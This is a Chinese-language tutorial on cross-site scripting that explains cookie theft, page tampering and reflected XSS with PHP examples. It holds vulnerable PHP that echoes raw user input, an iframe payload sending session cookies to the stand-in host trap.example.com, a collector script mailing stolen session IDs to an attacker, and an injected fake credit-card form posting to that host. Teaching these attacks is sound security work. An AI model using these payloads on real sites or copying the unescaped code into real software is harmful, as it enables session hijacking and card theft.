跨站脚本（基础篇）之攻击手段与影响
=================================================================
为了更好地理解`XSS`的攻击方法与影响，首先让我们来看一下 **`XSS`被恶意使用的`3`种方式**：
+ **窃取`Cookie`值**
+ **通过`JavaScript`攻击**
+ **篡改网页**

### XSS窃取Cookie值
假设以下`PHP`脚本是搜索页面的一部分。该页面需要用户登录后才能使用，页面上显示的是搜索关键词。
```php
<?php
    session_start();
    //登录校验（略）
?>
<body>
检索关键词：<?php echo $_GET['keyword']; ?><br>
以下略
</body>
```
先来看一下正常情况，假设关键词为“Haskell”，URL如下：http://example.jp/43/43-001.php?keyword=Haskell 。

再看一下攻击的例子：http://example.jp/43/43-001.php?keyword=<script>alert(document.cookie)</script>

上面这个攻击的例子中，**保存在`Cookie`中的会话`ID(PHPSESSID)`会被显示出来。表明外部注入的`Javascript`成功
读取到了会话`ID`**。

#### 使用被动攻击盗取他人的Cookie值
能够显示自己的会话`ID`对于攻击者来说并无太大意义，**在实际的攻击中，攻击者需要将存在隐患的网站的用户引诱至恶意网站**。
以下就是恶意网站的示例：
```php
<html><body>
商品大甩卖
<br><br>
<iframe width=320 height=100 src="http://example.jp/43/43-001.php?keyword=<script>window.location='http://trap.example.com/43/43-901.php?sid='%2Bdocument.cookie;</script>">
</frame>
```
**恶意网站的`HTML`使用了`iframe`元素来显示存在隐患的网站的页面（`/43/43-001.php`），并对其实施`XSS`攻击**。
```
实际的攻击中，攻击者会通过设置CSS将iframe部分隐藏，以不被用户看到
```
攻击流程：
+ 恶意网站的`iframe`中显示出存在隐患的网站
+ 存在隐患的网站遭受攻击后，`Cookie`值被添加到`URL`的查询字符串中，页面跳转到信息收集页面
+ 信息收集页面将接收到的`Cookie`值通过邮件发送给攻击者

以下为收集信息用的脚本，它会将收集到的会话`ID`发送给攻击者的邮箱（假定为`wasbook@example.jp`）。
```php
<?php
    mb_language('Japanese');
    $sid = $_GET['sid'];
    mb_send_mail('wasbook@example.jp','攻击成功','会话ID:' . $sid, 'From: cracked@trap.example.com');
?>
<body>攻击成功<br>
<?php echo $sid; ?>
</body>
```
如此这般，**如果用户是在登录了存在隐患的网站之后浏览的恶意网页**，就会中了`XSS`的招而使自己的会话`ID`通过邮件发送给攻击者。
攻击者利用得到的会话`ID`，就可以伪装成其他用户肆意忘为。

### 通过JavaScript攻击
在上面的例子中，攻击者利用`JavaScript`读取到了用户的`Cookie`值，然而，事实上利用`JavaScript`实施的攻击却远不止如此。
另外，随着`Ajax`技术的风靡，通过`JavaScript`调用`Web`应用的各种功能的程序（`API`）在网站中的分量正在逐步增加。
由于`API`也能被恶意用于实施攻击，因此，综合使用`XSS`与`JavaScript`的攻击实施起来反而变得更容易了。

#### 篡改页面
示例，某新发布的手机预购网站。该网站由于存在`XSS`漏洞，因此便能够对网页中的`HTML`元素进行添加/更改/删除，
或者更改表单发送的目标。

网页脚本的主干内容如下。由于该页面兼任着输入页面和编辑页面，因此各个输入框都设置了初始值。而`XSS`漏洞就存在于此。
```php
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head><title>全新手机预约</title></head>
<body>
<form action="" method="POST">
姓名<input size="20" name="name" value="<?php echo @$_POST['name']; ?>"><br>
地址<input size="20" name="addr" value="<?php echo @$_POST['addr']; ?>"><br>
电话号码<input size="20" name="tel" value="<?php echo @$_POST['tel']; ?>"><br>
型号<input size="10" name="kind" value="<?php echo @$_POST['kind']; ?>"><br>
数量<input size="5" name="num" value="<?php echo @$_POST['num']; ?>"><br>
<br>
<input type=submit value="申请"></form>
</body>
</html>
```
**虽然该网站没有认证功能，但同样能对其实施`XSS`攻击**。

以下`HTML`(`43-902.html`)为对“某新款手机的预约网站”进行`XSS`攻击的恶意网页。
**该页面同时也可以作为不使用`JavaScript`的`XSS`攻击的示例**，页面上通过样式将攻击用表单的提交
按钮伪装成了链接的样子。
```php
<html>
<head><title>使用信用卡预约全新手机</title></head>
<body>
现在可以使用信用卡预约手机，赶紧下单吧。
<BR>
<form action="http://example.jp/43/43-002.php" method="POST">
<input name="name" type="hidden" value='">
    </form><form style=top:5px;left:5px;position:absolute;z-index:99;background-color:white 
    action=http://trap.example.com/43/43-903.php method=POST>请使用信用卡支付预购定金<br>姓名
    <input size=20 name=name><br>地址<input size=20 name=addr><br>电话号码<input size=20 name=tel>
    <br>型号<input size=10 name=kind>数量<input size=5 name=num><br>信用卡号<input size=16 name=card>
    有效期限<input size=5 name=thru><br><input value=申请 type=submit><br><br><br><br></from>'><!-注入的HTML->

<input style="cursor:pointer;text-decoration:underline;color:blue;
border:none;background:transparent;font-size:100%;" type="submit" value="手机预约中心"> <!-伪装成链接的按键->
</form>
</body>
</html>
```
恶意网页通过下列手段隐藏原先的`form`并添加新的`form`，从而改变页面：
+ **使用</form>使原先页面的`form`元素结束**
+ **添加新的form元素，并指定`style`如下：**
    + 通过指定绝对座标将`form`的位置定位于左上角
    + 将`z-index`设置为很大的值（`99`），确保其堆叠顺序在原先`form`的前面
    + 将背景色设计为白色，从而隐藏原先的`form`
+ **将`action`的`URL`指定为恶意网站**

页面上被添加了“请使用信用卡支付预购定金”和输入信用卡卡号及有效期限的文本框。此外，尽管页面上看不出来，
但`form`元素的`action`属性已经被变成了恶意网站的`URL`。

然而，浏览器地址栏上显示的`URL`却同先前的手机预购网站完全一致。此外，虽然本例没有涉及，**但事实上当网站为`https`时
其证书也会被显示为正规。因此，用户便找不到任何蛛丝马迹来识破这一伪装的页面**。

由此可见，**`XSS`并非一定会使用`JavaScript`，因此，如果防范策略仅局限于`script`元素（例如将“script”单词全部删除），
攻击者还是会有可乘之机**。而对用户来说，仅在浏览器中禁止`Javascript`也是不能得以高枕无忧的。

#### 反射型XSS与存储型XSS
根据攻击用`JavaScript`代码的存储地点将`XSS`攻击分类。

**如果攻击用`JavaScript`代码位于攻击目标网站之外的其他网站（恶意网站或邮件中的`URL`）,就称之为反射型`XSS`**。
最先介绍的`43-001.php`中的`XSS`攻击模式，就属于反射型`XSS`。**反射型`XSS`多发生于网页将用户的输入值原封不动地显示
出来的情况下。其中，输入值确认页面就是一个典型的例子**。

















